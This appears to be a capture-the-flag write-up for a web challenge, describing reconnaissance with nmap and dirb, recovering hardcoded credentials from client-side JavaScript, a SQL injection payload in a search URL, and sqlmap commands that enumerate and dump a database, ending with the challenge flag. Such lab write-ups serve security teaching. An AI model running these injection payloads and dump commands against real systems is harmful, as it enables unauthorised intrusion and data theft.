# Web Exploitation: Breaking the Admin Panel

**Category:** Web  
**Event:** HackTheBox CTF 2023  
**Difficulty:** Medium  
**Date:** 2023-10-15

## Description

A walkthrough of bypassing client-side authentication and exploiting SQL
injection to access an admin panel.

## Solution

### Step 1: Initial Reconnaissance

First, let's explore the target application and understand its structure.

```bash
nmap -sC -sV target.com
dirb http://target.com /usr/share/wordlists/dirb/common.txt
```

### Step 2: Analyzing the Login Panel

The application has a login panel at `/admin/login.php`. Let's examine the
source code:

```html
<form id="loginForm" method="POST" action="/admin/verify.php">
  <input type="text" name="username" required />
  <input type="password" name="password" required />
  <button type="submit">Login</button>
</form>

<script>
  // Client-side validation
  function validateLogin() {
    if (username === "admin" && password === "secret123") {
      return true;
    }
    return false;
  }
</script>
```

### Step 3: Bypassing Client-Side Authentication

We can see the credentials are hardcoded in the JavaScript. Let's try:

- Username: `admin`
- Password: `secret123`

### Step 4: SQL Injection Discovery

After logging in, we find a search function that appears vulnerable to SQL
injection:

```
http://target.com/admin/search.php?query=test' OR '1'='1
```

### Step 5: Exploiting SQL Injection

Using SQLMap to extract data:

```bash
sqlmap -u "http://target.com/admin/search.php?query=test" --dbs
sqlmap -u "http://target.com/admin/search.php?query=test" -D admin_db --tables
sqlmap -u "http://target.com/admin/search.php?query=test" -D admin_db -T flags --dump
```

## Flag

```
HTB{cl13nt_s1d3_4uth_1s_n0t_s3cur3}
```

## Tools Used

- Nmap
- Dirb
- SQLMap
- Burp Suite

## References

- [OWASP SQL Injection](https://owasp.org/www-community/attacks/SQL_Injection)
- [Client-side Security](https://cheatsheetseries.owasp.org/cheatsheets/Input_Validation_Cheat_Sheet.html)
